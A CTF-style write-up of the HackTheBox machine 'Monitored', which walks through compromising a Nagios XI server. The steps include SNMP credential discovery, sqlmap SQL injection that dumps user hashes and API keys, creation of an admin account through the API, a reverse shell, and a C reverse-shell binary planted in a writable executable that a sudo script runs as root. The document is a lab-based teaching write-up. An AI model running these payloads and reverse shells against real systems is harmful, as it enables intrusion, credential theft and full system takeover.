# HTB Machine Writeup: Monitored
### By: gnos1s

## Machine Difficulty: Medium
## Operating System: Linux
## Release Date: 13 Jan 2024

## Enumeration

As usual, we start off with our Nmap scan:

```
$ nmap -sC -sV -oA nmap/monitored 10.10.11.248
# Nmap 7.92 scan initiated Sun Jan 14 09:29:58 2024 as: nmap -sC -sV -oA nmap/monitored 10.10.11.248
Nmap scan report for 10.10.11.248
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn:
|_  http/1.1
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 09:31:07 2024 -- 1 IP address (1 host up) scanned in 69.00 seconds
```

I usually leave out UDP scans, but there is something interesting:

```
$ sudo nmap -sU 10.10.11.248
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-15 17:13 HKT
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.045s latency).

PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

We can see HTTP and HTTPS running on ports 80 and 443; HTTP just redirects to HTTPS. Nmap reveals the domain 'nagios.monitored.htb'. Let's add the domain into our hosts file:

```
$ echo "10.10.11.248 nagios.monitored.htb monitored.htb" >> /etc/hosts
```

Aside from that and SSH, LDAP is also running. We can do some enumeration but I didn't find anything. Interestingly, SNMP is running on UDP port 161. Let's run ```snmpwalk``` to enumerate the service:

```
$ snmpwalk -v2c -c public 10.10.11.248
```

After letting snmpwalk run for a while, we find some interesting information that look like credentials:

```
<snip>

HOST-RESOURCES-MIB::hrSWRunParameters.980 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.981 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.1027 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
HOST-RESOURCES-MIB::hrSWRunParameters.1453 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1454 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1468 = STRING: "-bd -q30m"
HOST-RESOURCES-MIB::hrSWRunParameters.39589 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.50285 = ""

<snip>
```

Getting back to HTTPS, we see a webserver running Nagios XI, a monitoring application:

![login](posts/HTB%20Machines/Monitored/assets/login.png)

There actually is a CVE in this version of Nagios, but we can't use it yet. We can try our creds we found some SNMP, but they don't work; the CVE requires authentication. We can try a directory fuzz:

```
$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://nagios.monitored.htb/FUZZ
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nagios.monitored.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/15 18:32:44 Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 335] [--> https://nagios.monitored.htb/javascript/]
/nagios               (Status: 301) [Size: 5621] [--> https://nagios.monitored.htb/nagios/]
```

There is one interesting directory: /nagios. When we browse there, it tells us to enter a password. The svc creds we found earlier actually do work here:

![nagios_initial](nagios_initial.png)![nagios_login](nagios.png)

This looks like a documentation page. I did a lot of poking around here and there doesn't seem to be anything interesting. Let's do more fuzzing:

```
$ gobuster dir -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://nagios.monitored.htb/nagiosxi/ -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nagios.monitored.htb/nagiosxi/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/ethanwang/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/15 17:34:35 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/images/]
/about                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/about/]
/help                 (Status: 301) [Size: 338] [--> https://nagios.monitored.htb/nagiosxi/help/]
/tools                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/tools/]
/mobile               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/mobile/]
/admin                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/admin/]
/reports              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/reports/]
/account              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/account/]
/includes             (Status: 301) [Size: 342] [--> https://nagios.monitored.htb/nagiosxi/includes/]
/backend              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/backend/]
/db                   (Status: 301) [Size: 336] [--> https://nagios.monitored.htb/nagiosxi/db/]
/api                  (Status: 301) [Size: 337] [--> https://nagios.monitored.htb/nagiosxi/api/]
/config               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/config/]
/sounds               (Status: 403) [Size: 286]
/terminal             (Status: 200) [Size: 5215]
```

I had a look at all of these directories, and only /api and /terminal were interesting. /terminal looks like an interactive terminal, but our creds don't work on it. When we try to access the /api endpoint, we get an error:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/ -k
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at nagios.monitored.htb Port 443</address>
</body></html>
```

Let's try /api/v1:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/ -k
{"error":"No request was made"}
```

Now we get a JSON error saying "No request was made". Let's try to access an endpoint:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/test -k
{"error":"No API Key provided"}
```

We need an API key, but we don't have it. Let's do another fuzz to see if any endpoints don't show this message:

```
$ gobuster dir -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://nagios.monitored.htb/nagiosxi/api/v1/ -k --exclude-length 32
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nagios.monitored.htb/nagiosxi/api/v1/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/ethanwang/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] Exclude Length:          32
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/15 17:39:49 Starting gobuster in directory enumeration mode
===============================================================
/license              (Status: 200) [Size: 34]
/authenticate         (Status: 200) [Size: 53]
```

/license just says Unknown API endpoint, which is interesting:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/license -k
{"error":"Unknown API endpoint."}
```

/authenticate is interesting though:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
{"error":"You can only use POST with authenticate."}
```

Let's send a POST request:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -X POST
{"error":"Must be valid username and password."}
```

Pass username and password as POST parameters, with the creds we found earlier:

```
$ curl https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -X POST -d 'username=svc&password=XjH7VCehowpR1xZB' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   189  100   151  100    38    379     95 --:--:-- --:--:-- --:--:--   494
{
  "username": "svc",
  "user_id": "2",
  "auth_token": "66678ccabe4e7191c6f8b2e30fd2b5603b324cd0",
  "valid_min": 5,
  "valid_until": "Mon, 15 Jan 2024 04:50:27 -0500"
}
```

## Foothold

We got an auth token! Now, we need to work out how to use it. After a lot of research, I found [this article](https://support.nagios.com/forum/viewtopic.php?f=16&t=58783). It was mentioned in the article that the auth_token can be used by passing the "token" GET parameter. Let's try it:

![home_svc](home_svc.png)

We logged in as svc! Now, we can actually use the CVE we found earlier, CVE-2023-40933. There is an SQL injection in some kind of banner. We can use this CVE using sqlmap:

```
sqlmap --url 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=ca28fca7695b6ee837fcd9e70afdb58039b7d0fa' -p id --batch --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:53:26 /2024-01-15/

[17:53:27] [INFO] resuming back-end DBMS 'mysql'
[17:53:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('nagiosxi=r456cue6in5...otcftucppc'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (9241=9241) THEN 3 ELSE (SELECT 4760 UNION SELECT 9627) END))&token=6f84be4a5d3011d28222777d799b492ff2d1f1e7

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 3477 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(3477=3477,1))),0x7171766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&token=6f84be4a5d3011d28222777d799b492ff2d1f1e7

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 1640 FROM (SELECT(SLEEP(5)))QyfG)&token=6f84be4a5d3011d28222777d799b492ff2d1f1e7
---
[17:53:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:53:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:53:27] [INFO] fetching current database
[17:53:27] [INFO] retrieved: 'nagiosxi'
[17:53:27] [INFO] fetching tables for database: 'nagiosxi'
[17:53:27] [INFO] fetching columns for table 'xi_cmp_trapdata' in database 'nagiosxi'
[17:53:28] [INFO] retrieved: 'trapdata_id'
[17:53:28] [INFO] retrieved: 'int(11)'
```

We can't dump the whole database because there are way too many entries; it would be a waste of time. Let's dump all the tables with the --tables flag:

```
[17:54:45] [INFO] fetching tables for database: 'nagiosxi'
Database: nagiosxi
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```

xi_users looks interesting. We can enumerate it:

```
Table: xi_users
[6 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$1c3050a52fe7f09a457e1uxIl3eEKBE87McomD7NxM/6b2bNhJ226 | nagiosadmin | 0          | 1701931372 | 1           | 1705221171  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 8              | 0              | 1705221171           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705220287   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 11             | 1699697433           |
| 6       | pwned@pwned.com     | pwned                | gurARgnMiFpSgIed7C8bGVNHKZcDMF6d5XU6giBiW5pk7nsq8A6Nqo5gf2pKkqXg | 1       | $2a$10$fe1219651355e97082d53OAxeJyROZajTv9RG7fHVoGGgKVBS0Lhe | pwned       | 0          | 1705220069 | 0           | 0           | 0            | 0            | b83Dmgna0VE4VlDANl6INoX08kDblEiAY3VYBEnclEaVZPVaFHkCA3s2rfEP7vFB | 0              | 0              | 1705217678           |
| 7       | pwned@pwned.com     | test                 | 8Mt9kfPJZjSj2blWsioYW20c3N57YnrqThZXgelTHbOr7IgpJ3VCnWoaPLJQ486l | 1       | $2a$10$1abfec87a3f3ff89fa7b6OQbyyDM0YEb7lv9fhm5PnUnRVbHN1aQG | test        | 0          | 1705218584 | 0           | 0           | 0            | 0            | LDOiDR39gSW9WdgsQJT6YLDYYv5mZTnATifU04lgnnpLH4TrInoqAKCGf7idpeng | 0              | 0              | 1705218592           |
| 8       | pwned@pwned.com     | uwu                  | HTHHVnaiPv290lXjPbC8NthsK7oTjjUWjRZZIUmjTrS2mdvZQdHaiOqKWfZMVYPd | 1       | $2a$10$c576236aaa35d133eb187OH0iiONbDKkxevbOCU7LKs368rpY5.Jq | uwu         | 0          | 1705220963 | 0           | 0           | 0            | 0            | QIEXZHRtvr3ps8kjNDFKCYL6Al2VERICejUrhbDSGbG5IbW4KvFabBmDdq2SlDs8 | 0              | 0              | 1705220973           |
| 10      | pwned@pwned.com     | hex                  | WUZV7eEWf5JXFmpcU2ZE QI6QGZ3iP6nNtZAqc5YjZO2dSneHrjf0qToG85ckV   | 1       | $2a$10$da8081902c26ec324858auG7euU6hWNYCrGD/vQ2jkQa6Y8n5mDp2 | test666     | 0          | 1705221860 | 0           | 1705221904  | 0            | 0            | EjLhv44DRechAK38nFBTZP0muGsTff9f4GHlNfSMSV9KcJOL5vXZiFcuU2AsveaQ | 10             | 0              | 1705221882           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+

[17:55:36] [INFO] table 'nagiosxi.xi_users' dumped to CSV file '/Users/ethanwang/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv'
[17:55:36] [INFO] fetched data logged to text files under '/Users/ethanwang/.local/share/sqlmap/output/nagios.monitored.htb'
```

It's not neat at all, but we do have all of the users. We can try cracking the hash of the nagiosadmin user, but it doesn't work. Interestingly (I use this word way too much), he does have an API key! This means we can probably use that key to access the API again.

I did some research on what can be done with this API key, and it turns out we can create our own admin user. We can send a request to /nagiosxi/api/v1/system/user with the user we want to create. Here is the command I used:

```
$ curl -X POST --insecure 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d "username=gnos1s&password=test&name=test&email=test@test.com@auth_level=admin"
{"success":"User account gnos1s was added successfully!","user_id":14}
```

It shows that our account was created. We can now log in as that user:

![admin](admin.png)

For some reason Nagios prompts me to change my password, but we can see that we have admin perms from the buttons on the top. Now, we just have to get a shell.

First, we create a command in the Core Config Manager (we can select from Configure menu on the top):

![new_cmd](new_cmd.png)

Next, we go to Monitoring -> Services on the left and create a new service: We can select our command and click "Run check command". This is enough to get us a shell:

![services_1](services_1.png) ![services_2](services_2.png)
```
$ nc -lvvvnp 9002
Listening on any address 9002 (dynamid)
Connection from 10.10.11.248:57768
bash: cannot set terminal process group (66832): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$
```

We can now read the user flag:

```
nagios@monitored:~$ ls
ls
cookie.txt
user.txt
nagios@monitored:~$ cat user.txt
cat user.txt
********************************
```

Let's put our key into the authorized_keys file so we can login with SSH:

```
nagios@monitored:~/.ssh$ curl http://10.10.16.2:8000/id_rsa.pub >> authorized_keys
<ttp://10.10.16.2:8000/id_rsa.pub >> authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   579  100   579    0     0   2718      0 --:--:-- --:--:-- --:--:--  2731
```
```
ssh -i id_rsa nagios@10.10.11.248

<snip>

Last login: Mon Jan 15 04:36:21 2024 from 10.10.16.4
nagios@monitored:~$
```
## Root

Running sudo -l, we see we can run a bunch of scripts as root:

```
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

Upon running linPEAS, we also find some writable executables:

```
$ ./linpeas.sh

<snip>

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
```
Reading through those scripts from sudo -l, we find that the getprofile.sh script calls the writable executable:

```
nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/components/getprofile.sh
#!/bin/bash

<snip>

echo "Getting Nagios Core version..."
/usr/local/nagios/bin/nagios --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nagios.txt"
```

This means we can write a shell into the writable executable, run the script as root, and we will have a root shell!

First, let's make a C reverse shell and compile it:

```c
#include <stdlib.h>
#include <unistd.h>

int main()
{
	setuid(0);
	setgid(0);
	system("bash -c 'bash -i >& /dev/tcp/10.10.16.2/9002 0>&1'");
}
```

```
nagios@monitored:~$ gcc a.c
```

Next, we move the script into where the executable was:

```
nagios@monitored:~$ mv a.out /usr/local/nagios/bin/nagios
```

Run the script:

```
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 2
mv: cannot stat '/usr/local/nagiosxi/tmp/profile-2.html': No such file or directory
-------------------Fetching Information-------------------
Please wait.......
Creating system information...
Creating nagios.txt...
Creating perfdata.txt...
Creating npcd.txt...
Creating cmdsubsys.txt...
Creating event_handler.txt...
Creating eventman.txt...
Creating perfdataproc.txt...
Creating sysstat.txt...
Creating systemlog.txt...
Retrieving all snmp logs...
Creating apacheerrors.txt...
Creating mysqllog.txt...
Getting xi_users...
Getting xi_usermeta...
Getting xi_options(mail)...
Getting xi_otions(smtp)...
Creating a sanatized copy of config.inc.php...
Creating memorybyprocess.txt...
Creating filesystem.txt...
Dumping PS - AEF to psaef.txt...
Creating top log...
Creating sar log...
Copying objects.cache...
Copying MRTG Configs...
tar: Removing leading `/' from member names
Counting Performance Data Files...
Counting MRTG Files...
Getting Network Information...
Getting CPU info...
Getting memory info...
Getting ipcs Information...
Getting SSH terminal / shellinabox yum info...
Getting Nagios Core version...
```

The script hangs when it runs the executable. When we look back at the listener, we have a root shell! We can then grab the root flag:

```
$ nc -lvvvnp 9002
Listening on any address 9002 (dynamid)
Connection from 10.10.11.248:57552
root@monitored:/home/nagios#
root@monitored:/home/nagios# cat /root/root.txt
cat /root/root.txt
********************************
```
## Conclusion

In general, this box was rather difficult for a medium; The user flag had multiple steps and was a little confusing to exploit, but root was pretty easy. I had a lot of fun playing the box, and I really like the concept of being able to go from nothing to root with just one application (Nagios). I learned a lot along the way as well; it was a great experience the whole way though, huge thanks to the creators (TheCyberGeek and ruycr4ft). Thank you for reading, and have a good one!